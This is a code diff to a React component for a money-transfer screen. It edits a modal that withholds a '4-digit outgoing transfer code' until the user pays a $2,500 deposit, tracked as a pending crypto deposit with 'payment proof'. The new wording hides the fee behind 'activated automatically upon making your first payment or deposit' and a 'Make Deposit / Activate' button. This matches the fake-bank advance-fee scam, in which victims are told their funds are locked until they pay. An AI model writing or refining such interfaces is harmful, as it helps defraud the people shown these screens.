@@ -703,9 +703,9 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess, onNavigat
             </div>
 
             <div className="text-center space-y-2">
-              <h3 className="text-lg font-bold text-white">$2,500 Deposit Required for 4-Digit Code</h3>
+              <h3 className="text-base font-bold text-white uppercase tracking-wider text-amber-400">4-Digit Outgoing Transfer Code - PENDING PAYMENT / DEPOSIT $2,500</h3>
               <p className="text-xs text-slate-300 leading-relaxed">
-                To generate your bank 4-digit transfer security code, a <span className="font-bold text-amber-400">$2,500 USD</span> deposit is required.
+                Your official 4-digit security code will be generated and activated automatically upon making your first payment or deposit.
               </p>
             </div>
 
@@ -742,7 +742,7 @@ export const SendPanel: React.FC<SendPanelProps> = ({ user, onSuccess, onNavigat
                 className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
               >
                 <DollarSign className="w-4 h-4" />
-                {user.pendingCryptoDeposit?.status === 'Pending' ? 'Update Payment Proof ($2,500 Deposit)' : 'Proceed to $2,500 Payment Method'}
+                <span>$ Make Deposit / Activate</span>
               </button>
 
               <button
